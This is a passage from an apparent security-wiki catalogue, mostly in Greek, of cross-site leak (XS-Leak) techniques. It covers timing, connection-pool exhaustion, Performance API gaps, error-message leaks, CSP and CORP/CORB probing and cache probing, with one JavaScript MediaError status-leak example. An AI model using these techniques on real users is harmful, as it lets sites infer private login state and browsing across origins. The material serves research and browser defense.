* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **Summary:** Μια μέθοδος για να μετρήσετε τον χρόνο εκτέλεσης μιας διαδικασίας ιστού περιλαμβάνει σκόπιμα το μπλοκάρισμα του event loop ενός νήματος και στη συνέχεια το χρονισμό **πόσο χρόνο χρειάζεται για να γίνει ξανά διαθέσιμο το event loop**. Εισάγοντας μια μπλοκαρισμένη λειτουργία (όπως μια μακρά υπολογιστική διαδικασία ή μια συγχρονισμένη κλήση API) στο event loop και παρακολουθώντας τον χρόνο που χρειάζεται για να αρχίσει η εκτέλεση του επόμενου κώδικα, μπορεί κανείς να συμπεράνει τη διάρκεια των εργασιών που εκτελούνταν στο event loop κατά τη διάρκεια της μπλοκαρισμένης περιόδου. Αυτή η τεχνική εκμεταλλεύεται τη μονόνημα φύση του event loop της JavaScript, όπου οι εργασίες εκτελούνται διαδοχικά, και μπορεί να παρέχει πληροφορίες σχετικά με την απόδοση ή τη συμπεριφορά άλλων λειτουργιών που μοιράζονται το ίδιο νήμα.
* **Code Example**:

Ένα σημαντικό πλεονέκτημα της τεχνικής μέτρησης του χρόνου εκτέλεσης κλειδώνοντας το event loop είναι η δυνατότητά της να παρακάμψει **Site Isolation**. **Site Isolation** είναι μια λειτουργία ασφαλείας που χωρίζει διαφορετικές ιστοσελίδες σε ξεχωριστές διαδικασίες, με στόχο να αποτρέψει κακόβουλες ιστοσελίδες από το να έχουν άμεση πρόσβαση σε ευαίσθητα δεδομένα από άλλες ιστοσελίδες. Ωστόσο, επηρεάζοντας τον χρονισμό εκτέλεσης μιας άλλης προέλευσης μέσω του κοινόχρηστου event loop, ένας επιτιθέμενος μπορεί έμμεσα να εξάγει πληροφορίες σχετικά με τις δραστηριότητες αυτής της προέλευσης. Αυτή η μέθοδος δεν βασίζεται σε άμεση πρόσβαση στα δεδομένα της άλλης προέλευσης αλλά παρατηρεί την επίδραση των δραστηριοτήτων αυτής της προέλευσης στο κοινόχρηστο event loop, αποφεύγοντας έτσι τα προστατευτικά εμπόδια που έχουν καθοριστεί από το **Site Isolation**.

{% hint style="warning" %}
Σε έναν χρονισμό εκτέλεσης είναι δυνατόν να **εξαλείψετε** **παράγοντες δικτύου** για να αποκτήσετε **πιο ακριβείς μετρήσεις**. Για παράδειγμα, φορτώνοντας τους πόρους που χρησιμοποιούνται από τη σελίδα πριν τη φορτώσετε.
{% endhint %}

### Connection Pool

* **Inclusion Methods**: JavaScript Requests
* **Detectable Difference**: Χρονισμός (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **Summary:** Ένας επιτιθέμενος θα μπορούσε να κλειδώσει όλες τις υποδοχές εκτός από 1, να φορτώσει τον στοχευμένο ιστό και ταυτόχρονα να φορτώσει μια άλλη σελίδα, ο χρόνος μέχρι να αρχίσει να φορτώνει η τελευταία σελίδα είναι ο χρόνος που χρειάστηκε η στοχευμένη σελίδα για να φορτώσει.
* **Code Example**:

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

Οι περιηγητές χρησιμοποιούν υποδοχές για την επικοινωνία με τον διακομιστή, αλλά λόγω των περιορισμένων πόρων του λειτουργικού συστήματος και του υλικού, **οι περιηγητές αναγκάζονται να επιβάλουν ένα όριο** στον αριθμό των ταυτόχρονων υποδοχών. Οι επιτιθέμενοι μπορούν να εκμεταλλευτούν αυτόν τον περιορισμό μέσω των εξής βημάτων:

1. Προσδιορίστε το όριο υποδοχών του περιηγητή, για παράδειγμα, 256 παγκόσμιες υποδοχές.
2. Καταλάβετε 255 υποδοχές για παρατεταμένη διάρκεια ξεκινώντας 255 αιτήματα σε διάφορους διακομιστές, σχεδιασμένα να κρατούν τις συνδέσεις ανοιχτές χωρίς να ολοκληρώνονται.
3. Χρησιμοποιήστε την 256η υποδοχή για να στείλετε ένα αίτημα στη στοχευμένη σελίδα.
4. Προσπαθήστε να κάνετε ένα 257ο αίτημα σε διαφορετικό διακομιστή. Δεδομένου ότι όλες οι υποδοχές είναι σε χρήση (όπως αναφέρεται στα βήματα 2 και 3), αυτό το αίτημα θα είναι σε αναμονή μέχρι να γίνει διαθέσιμη μια υποδοχή. Η καθυστέρηση πριν προχωρήσει αυτό το αίτημα παρέχει στον επιτιθέμενο πληροφορίες χρονισμού σχετικά με τη δικτυακή δραστηριότητα που σχετίζεται με την 256η υποδοχή (την υποδοχή της στοχευμένης σελίδας). Αυτή η συμπερασματική είναι δυνατή επειδή οι 255 υποδοχές από το βήμα 2 είναι ακόμα απασχολημένες, υποδηλώνοντας ότι οποιαδήποτε νέα διαθέσιμη υποδοχή πρέπει να είναι αυτή που απελευθερώθηκε από το βήμα 3. Ο χρόνος που χρειάζεται για να γίνει διαθέσιμη η 256η υποδοχή συνδέεται άμεσα με τον χρόνο που απαιτείται για να ολοκληρωθεί το αίτημα στη στοχευμένη σελίδα.

Για περισσότερες πληροφορίες: [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Connection Pool by Destination

* **Inclusion Methods**: JavaScript Requests
* **Detectable Difference**: Χρονισμός (γενικά λόγω Περιεχομένου Σελίδας, Κωδικός Κατάστασης)
* **More info**:
* **Summary:** Είναι όπως η προηγούμενη τεχνική αλλά αντί να χρησιμοποιεί όλες τις υποδοχές, το Google **Chrome** θέτει ένα όριο **6 ταυτόχρονων αιτημάτων στην ίδια προέλευση**. Αν **μπλοκάρουμε 5** και στη συνέχεια **εκκινήσουμε ένα 6ο** αίτημα μπορούμε να **χρονίσουμε** το και αν καταφέρουμε να κάνουμε τη **σελίδα θύμα να στείλει** περισσότερα **αιτήματα** στο ίδιο endpoint για να ανιχνεύσουμε μια **κατάσταση** της **σελίδας**, το **6ο αίτημα** θα διαρκέσει **περισσότερο** και μπορούμε να το ανιχνεύσουμε.

## Performance API Techniques

Η [`Performance API`](https://developer.mozilla.org/en-US/docs/Web/API/Performance) προσφέρει πληροφορίες σχετικά με τις μετρικές απόδοσης των διαδικτυακών εφαρμογών, εμπλουτισμένη περαιτέρω από την [`Resource Timing API`](https://developer.mozilla.org/en-US/docs/Web/API/Resource\_Timing\_API). Η Resource Timing API επιτρέπει την παρακολούθηση λεπτομερών χρονισμών αιτημάτων δικτύου, όπως η διάρκεια των αιτημάτων. Σημαντικά, όταν οι διακομιστές περιλαμβάνουν την επικεφαλίδα `Timing-Allow-Origin: *` στις απαντήσεις τους, επιπλέον δεδομένα όπως το μέγεθος μεταφοράς και ο χρόνος αναζήτησης τομέα γίνονται διαθέσιμα.

Αυτή η πλούσια συλλογή δεδομένων μπορεί να ανακτηθεί μέσω μεθόδων όπως [`performance.getEntries`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntries) ή [`performance.getEntriesByName`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/getEntriesByName), παρέχοντας μια ολοκληρωμένη εικόνα των πληροφοριών που σχετίζονται με την απόδοση. Επιπλέον, η API διευκολύνει τη μέτρηση χρόνων εκτέλεσης υπολογίζοντας τη διαφορά μεταξύ χρονοσημάνσεων που αποκτώνται από [`performance.now()`](https://developer.mozilla.org/en-US/docs/Web/API/Performance/now). Ωστόσο, αξίζει να σημειωθεί ότι για ορισμένες λειτουργίες σε περιηγητές όπως το Chrome, η ακρίβεια του `performance.now()` μπορεί να περιορίζεται σε χιλιοστά του δευτερολέπτου, γεγονός που μπορεί να επηρεάσει την λεπτομέρεια των μετρήσεων χρονισμού.

Πέρα από τις μετρήσεις χρονισμού, η Performance API μπορεί να αξιοποιηθεί για πληροφορίες που σχετίζονται με την ασφάλεια. Για παράδειγμα, η παρουσία ή η απουσία σελίδων στο αντικείμενο `performance` στο Chrome μπορεί να υποδηλώνει την εφαρμογή του `X-Frame-Options`. Συγκεκριμένα, αν μια σελίδα αποκλείεται από την απόδοση σε ένα πλαίσιο λόγω του `X-Frame-Options`, δεν θα καταγραφεί στο αντικείμενο `performance`, παρέχοντας μια λεπτή ένδειξη σχετικά με τις πολιτικές πλαισίωσης της σελίδας.

### Error Leak

* **Inclusion Methods**: Frames, HTML Elements
* **Detectable Difference**: Κωδικός Κατάστασης
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Ένα αίτημα που έχει ως αποτέλεσμα σφάλματα δεν θα δημιουργήσει μια είσοδο χρονισμού πόρου.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Error%20Leak](https://xsinator.com/testing.html#Performance%20API%20Error%20Leak)

Είναι δυνατόν να **διακρίνετε μεταξύ των κωδικών κατάστασης HTTP** επειδή τα αιτήματα που οδηγούν σε **σφάλμα** δεν **δημιουργούν μια είσοδο απόδοσης**.

### Style Reload Error

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Κωδικός Κατάστασης
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Λόγω ενός σφάλματος του περιηγητή, τα αιτήματα που έχουν ως αποτέλεσμα σφάλματα φορτώνονται δύο φορές.
* **Code Example**: [https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak](https://xsinator.com/testing.html#Style%20Reload%20Error%20Leak)

Στην προηγούμενη τεχνική εντοπίστηκαν επίσης δύο περιπτώσεις όπου σφάλματα του περιηγητή στο GC οδηγούν σε **πόρους που φορτώνονται δύο φορές όταν αποτυγχάνουν να φορτωθούν**. Αυτό θα έχει ως αποτέλεσμα πολλαπλές εισόδους στην Performance API και μπορεί έτσι να ανιχνευθεί.

### Request Merging Error

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Κωδικός Κατάστασης
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Τα αιτήματα που έχουν ως αποτέλεσμα σφάλμα δεν μπορούν να συγχωνευθούν.
* **Code Example**: [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

Η τεχνική βρέθηκε σε έναν πίνακα στο αναφερόμενο έγγραφο αλλά δεν βρέθηκε περιγραφή της τεχνικής σε αυτό. Ωστόσο, μπορείτε να βρείτε τον πηγαίο κώδικα ελέγχοντας το [https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak](https://xsinator.com/testing.html#Request%20Merging%20Error%20Leak)

### Empty Page Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Περιεχόμενο Σελίδας
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Κενές απαντήσεις δεν δημιουργούν εισόδους χρονισμού πόρων.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak](https://xsinator.com/testing.html#Performance%20API%20Empty%20Page%20Leak)

Ένας επιτιθέμενος μπορεί να ανιχνεύσει αν ένα αίτημα είχε ως αποτέλεσμα ένα κενό σώμα HTTP επειδή οι **κενές σελίδες δεν δημιουργούν μια είσοδο απόδοσης σε ορισμένους περιηγητές**.

### **XSS-Auditor Leak**

* **Inclusion Methods**: Frames
* **Detectable Difference**: Περιεχόμενο Σελίδας
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Χρησιμοποιώντας τον XSS Auditor στις Ασφαλιστικές Δηλώσεις, οι επιτιθέμενοι μπορούν να ανιχνεύσουν συγκεκριμένα στοιχεία ιστοσελίδας παρατηρώντας τις αλλαγές στις απαντήσεις όταν οι κατασκευασμένες payloads ενεργοποιούν τον μηχανισμό φιλτραρίσματος του auditor.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak](https://xsinator.com/testing.html#Performance%20API%20XSS%20Auditor%20Leak)

Στις Ασφαλιστικές Δηλώσεις (SA), ο XSS Auditor, αρχικά προορισμένος να αποτρέπει επιθέσεις Cross-Site Scripting (XSS), μπορεί παραδόξως να εκμεταλλευτεί για να διαρρεύσει ευαίσθητες πληροφορίες. Αν και αυτή η ενσωματωμένη λειτουργία αφαιρέθηκε από το Google Chrome (GC), εξακολουθεί να είναι παρούσα στο SA. Το 2013, οι Braun και Heiderich απέδειξαν ότι ο XSS Auditor θα μπορούσε ακούσια να αποκλείσει νόμιμα σενάρια, οδηγώντας σε ψευδώς θετικά. Βασισμένοι σε αυτό, οι ερευνητές ανέπτυξαν τεχνικές για την εξαγωγή πληροφοριών και την ανίχνευση συγκεκριμένου περιεχομένου σε σελίδες από άλλες προελεύσεις, μια έννοια γνωστή ως XS-Leaks, που αναφέρθηκε αρχικά από τον Terada και αναλύθηκε από τον Heyes σε μια ανάρτηση ιστολογίου. Αν και αυτές οι τεχνικές ήταν συγκεκριμένες για τον XSS Auditor στο GC, ανακαλύφθηκε ότι στο SA, οι σελίδες που αποκλείονται από τον XSS Auditor δεν δημιουργούν εισόδους στην Performance API, αποκαλύπτοντας μια μέθοδο μέσω της οποίας μπορεί να διαρρεύσει ευαίσθητη πληροφορία.

### X-Frame Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Επικεφαλίδα
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2), [https://xsleaks.github.io/xsleaks/examples/x-frame/index.html](https://xsleaks.github.io/xsleaks/examples/x-frame/index.html), [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-x-frame-options)
* **Summary:** Πόρος με επικεφαλίδα X-Frame-Options δεν δημιουργεί είσοδο χρονισμού πόρου.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak](https://xsinator.com/testing.html#Performance%20API%20X-Frame%20Leak)

Αν μια σελίδα **δεν επιτρέπεται** να **αποδοθεί** σε ένα **iframe** δεν δημιουργεί **είσοδο απόδοσης**. Ως αποτέλεσμα, ένας επιτιθέμενος μπορεί να ανιχνεύσει την επικεφαλίδα απάντησης **`X-Frame-Options`**.\
Το ίδιο συμβαίνει αν χρησιμοποιήσετε μια **embed** **ετικέτα.**

### Download Detection

* **Inclusion Methods**: Frames
* **Detectable Difference**: Επικεφαλίδα
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Οι λήψεις δεν δημιουργούν εισόδους χρονισμού πόρων στην Performance API.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20Download%20Detection](https://xsinator.com/testing.html#Performance%20API%20Download%20Detection)

Παρόμοια, με την XS-Leak που περιγράφεται, ένας **πόρος που κατεβάζεται** λόγω της επικεφαλίδας ContentDisposition, επίσης δεν **δημιουργεί είσοδο απόδοσης**. Αυτή η τεχνική λειτουργεί σε όλους τους κύριους περιηγητές.

### Redirect Start Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Ανακατεύθυνση
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Η είσοδος χρονισμού πόρου διαρρέει τον χρόνο έναρξης μιας ανακατεύθυνσης.
* **Code Example**: [https://xsinator.com/testing.html#Redirect%20Start%20Leak](https://xsinator.com/testing.html#Redirect%20Start%20Leak)

Βρήκαμε μια περίπτωση XS-Leak που εκμεταλλεύεται τη συμπεριφορά ορισμένων περιηγητών που καταγράφουν υπερβολικές πληροφορίες για διασυνοριακά αιτήματα. Το πρότυπο ορίζει ένα υποσύνολο χαρακτηριστικών που πρέπει να οριστούν σε μηδέν για διασυνοριακούς πόρους. Ωστόσο, στο **SA** είναι δυνατόν να ανιχνεύσετε αν ο χρήστης **ανακατευθύνεται** από τη στοχευμένη σελίδα, ελέγχοντας την **Performance API** και ελέγχοντας τα δεδομένα χρονισμού **redirectStart**.

### Duration Redirect Leak

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Ανακατεύθυνση
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Η διάρκεια των εισόδων χρονισμού είναι αρνητική όταν συμβαίνει μια ανακατεύθυνση.
* **Code Example**: [https://xsinator.com/testing.html#Duration%20Redirect%20Leak](https://xsinator.com/testing.html#Duration%20Redirect%20Leak)

Στο GC, η **διάρκεια** για αιτήματα που έχουν ως αποτέλεσμα μια **ανακατεύθυνση** είναι **αρνητική** και μπορεί έτσι να **διακριθεί** από αιτήματα που δεν έχουν ως αποτέλεσμα ανακατεύθυνση.

### CORP Leak

* **Inclusion Methods**: Frames
* **Detectable Difference**: Επικεφαλίδα
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.2)
* **Summary:** Πόρος προστατευμένος με CORP δεν δημιουργεί εισόδους χρονισμού πόρων.
* **Code Example**: [https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak](https://xsinator.com/testing.html#Performance%20API%20CORP%20Leak)

Σε ορισμένες περιπτώσεις, η **nextHopProtocol entry** μπορεί να χρησιμοποιηθεί ως τεχνική διαρροής. Στο GC, όταν η **επικεφαλίδα CORP** είναι ρυθμισμένη, η nextHopProtocol θα είναι **κενή**. Σημειώστε ότι το SA δεν θα δημιουργήσει καθόλου είσοδο απόδοσης για πόρους που έχουν ενεργοποιηθεί με CORP.

### Service Worker

* **Inclusion Methods**: Frames
* **Detectable Difference**: Χρήση API
* **More info**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **Summary:** Ανίχνευση αν ένας service worker είναι καταχωρημένος για μια συγκεκριμένη προέλευση.
* **Code Example**:

Οι service workers είναι σενάρια που εκτελούνται σε ένα προορισμό. Εκτελούνται στο παρασκήνιο μιας ιστοσελίδας και μπορούν να παρεμβαίνουν, να τροποποιούν και να **κάνουν cache πόρους** για να δημιουργήσουν διαδικτυακές εφαρμογές εκτός σύνδεσης.\
Αν ένας **πόρος που έχει γίνει cache** από έναν **service worker** προσπελαστεί μέσω **iframe**, ο πόρος θα **φορτωθεί από την cache του service worker**.\
Για να ανιχνεύσετε αν ο πόρος **φορτώθηκε από την cache του service worker**, μπορεί να χρησιμοποιηθεί η **Performance API**.\
Αυτό θα μπορούσε επίσης να γίνει με μια επίθεση χρονισμού (ελέγξτε το έγγραφο για περισσότερες πληροφορίες).

### Cache

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Χρονισμός
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **Summary:** Είναι δυνατόν να ελέγξετε αν ένας πόρος αποθηκεύτηκε στην cache.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

Χρησιμοποιώντας την [Performance API](xs-search.md#performance-api) είναι δυνατόν να ελέγξετε αν ένας πόρος είναι αποθηκευμένος στην cache.

### Network Duration

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Περιεχόμενο Σελίδας
* **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **Summary:** Είναι δυνατόν να ανακτηθεί η διάρκεια δικτύου ενός αιτήματος από την `performance` API.
* **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Error Messages Technique

### Media Error

* **Inclusion Methods**: HTML Elements (Video, Audio)
* **Detectable Difference**: Κωδικός Κατάστασης
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **Summary:** Στο Firefox είναι δυνατόν να διαρρεύσει με ακρίβεια τον κωδικό κατάστασης ενός διασυνοριακού αιτήματος.
* **Code Example**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
document.getElementById("log").innerHTML += msg;
}

function startup() {
let audioElement = document.getElementById("audio");
// "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
document.getElementById("startTest").addEventListener("click", function() {
audioElement.src = document.getElementById("testUrl").value;
}, false);
// Create the event handler
var errHandler = function() {
let err = this.error;
let message = err.message;
let status = "";

// Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
// Firefox error.message when the request loads successfully: "Failed to init decoder"
if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
status = "Success";
}else{
status = "Error";
}
displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
};
audioElement.onerror = errHandler;
}
```
The `MediaError` interface's message property uniquely identifies resources that load successfully with a distinct string. An attacker can exploit this feature by observing the message content, thereby deducing the response status of a cross-origin resource.

### CORS Error

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Summary:** Στις Δηλώσεις Ασφαλείας (SA), τα μηνύματα σφάλματος CORS εκθέτουν ακούσια το πλήρες URL των ανακατευθύνσεων.
* **Code Example**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

This technique enables an attacker to **extract the destination of a cross-origin site's redirect** by exploiting how Webkit-based browsers handle CORS requests. Specifically, when a **CORS-enabled request** is sent to a target site that issues a redirect based on user state and the browser subsequently denies the request, the **full URL of the redirect's target** is disclosed within the error message. This vulnerability not only reveals the fact of the redirect but also exposes the redirect's endpoint and any **sensitive query parameters** it may contain.

### SRI Error

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **Summary:** Στις Δηλώσεις Ασφαλείας (SA), τα μηνύματα σφάλματος CORS εκθέτουν ακούσια το πλήρες URL των ανακατευθύνσεων.
* **Code Example**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

An attacker can exploit **verbose error messages** to deduce the size of cross-origin responses. This is possible due to the mechanism of Subresource Integrity (SRI), which uses the integrity attribute to validate that resources fetched, often from CDNs, haven't been tampered with. For SRI to work on cross-origin resources, these must be **CORS-enabled**; otherwise, they're not subject to integrity checks. In Security Assertions (SA), much like the CORS error XS-Leak, an error message can be captured after a fetch request with an integrity attribute fails. Attackers can deliberately **trigger this error** by assigning a **bogus hash value** to the integrity attribute of any request. In SA, the resulting error message inadvertently reveals the content length of the requested resource. This information leakage allows an attacker to discern variations in response size, paving the way for sophisticated XS-Leak attacks.

### CSP Violation/Detection

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Status Code
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=313737](https://bugs.chromium.org/p/chromium/issues/detail?id=313737), [https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html](https://lists.w3.org/Archives/Public/public-webappsec/2013May/0022.html), [https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)
* **Summary:** Επιτρέποντας μόνο την ιστοσελίδα των θυμάτων στο CSP, αν προσπαθήσουμε να ανακατευθύνουμε σε διαφορετικό τομέα, το CSP θα ενεργοποιήσει ένα ανιχνεύσιμο σφάλμα.
* **Code Example**: [https://xsinator.com/testing.html#CSP%20Violation%20Leak](https://xsinator.com/testing.html#CSP%20Violation%20Leak), [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#intended-solution-csp-violation)

A XS-Leak can use the CSP to detect if a cross-origin site was redirected to a different origin. This leak can detect the redirect, but additionally, the domain of the redirect target leaks. The basic idea of this attack is to **allow the target domain on the attacker site**. Once a request is issued to the target domain, it **redirects** to a cross-origin domain. **CSP blocks** the access to it and creates a **violation report used as a leak technique**. Depending on the browser, **this report may leak the target location of the redirect**.\
Modern browsers won't indicate the URL it was redirected to, but you can still detect that a cross-origin redirect was triggered.

### Cache

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Page Content
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events](https://xsleaks.dev/docs/attacks/cache-probing/#cache-probing-with-error-events), [https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html](https://sirdarckcat.blogspot.com/2019/03/http-cache-cross-site-leaks.html)
* **Summary:** Καθαρίστε το αρχείο από την κρυφή μνήμη. Ανοίγει τη σελίδα στόχου και ελέγχει αν το αρχείο είναι παρόν στην κρυφή μνήμη.
* **Code Example:**

Browsers might use one shared cache for all websites. Regardless of their origin, it is possible to deduct whether a target page has **requested a specific file**.

If a page loads an image only if the user is logged in, you can **invalidate** the **resource** (so it's no longer cached if it was, see more info links), **perform a request** that could load that resource and try to load the resource **with a bad request** (e.g. using an overlong referer header). If the resource load **didn't trigger any error**, it's because it was **cached**.

### CSP Directive

* **Inclusion Methods**: Frames
* **Detectable Difference**: Header
* **More info**: [https://bugs.chromium.org/p/chromium/issues/detail?id=1105875](https://bugs.chromium.org/p/chromium/issues/detail?id=1105875)
* **Summary:** Οι κατευθυντήριες γραμμές CSP header μπορούν να ερευνηθούν χρησιμοποιώντας την ιδιότητα iframe CSP, αποκαλύπτοντας λεπτομέρειες πολιτικής.
* **Code Example**: [https://xsinator.com/testing.html#CSP%20Directive%20Leak](https://xsinator.com/testing.html#CSP%20Directive%20Leak)

A novel feature in Google Chrome (GC) allows web pages to **propose a Content Security Policy (CSP)** by setting an attribute on an iframe element, with policy directives transmitted along with the HTTP request. Normally, the embedded content must **authorize this via an HTTP header**, or an **error page is displayed**. However, if the iframe is already governed by a CSP and the newly proposed policy isn't more restrictive, the page will load normally. This mechanism opens a pathway for an attacker to **detect specific CSP directives** of a cross-origin page by identifying the error page. Although this vulnerability was marked as fixed, our findings reveal a **new leak technique** capable of detecting the error page, suggesting that the underlying problem was never fully addressed.

### **CORP**

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Header
* **More info**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Summary:** Οι πόροι που είναι ασφαλισμένοι με την Πολιτική Πόρων Διαφορετικών Προελεύσεων (CORP) θα προκαλέσουν σφάλμα όταν ανακτηθούν από μια μη επιτρεπόμενη προέλευση.
* **Code Example**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

The CORP header is a relatively new web platform security feature that when set b**locks no-cors cross-origin requests to the given resource**. The presence of the header can be detected, because a resource protected with CORP will **throw an error when fetched**.

### CORB

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Summary**: Το CORB μπορεί να επιτρέψει στους επιτιθέμενους να ανιχνεύσουν πότε η **`nosniff` header είναι παρούσα** στην αίτηση.
* **Code Example**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

Check the link for more information about the attack.

### CORS error on Origin Reflection misconfiguration <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Summary**: Αν η κεφαλίδα Origin ανακλάται στην κεφαλίδα `Access-Control-Allow-Origin`, είναι δυνατόν να ελέγξουμε αν ένας πόρος είναι ήδη στην κρυφή μνήμη.
* **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

In case the **Origin header** is being **reflected** in the header `Access-Control-Allow-Origin` an attacker can abuse this behaviour to try to **fetch** the **resource** in **CORS** mode. If an **error** **isn't** triggered, it means that it was **correctly retrieved form the web**, if an error is **triggered**, it's because it was **accessed from the cache** (the error appears because the cache saves a response with a CORS header allowing the original domain and not the attackers domain)**.**\
Note that if the origin isn't reflected but a wildcard is used (`Access-Control-Allow-Origin: *`) this won't work.

## Readable Attributes Technique

### Fetch Redirect

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Status Code
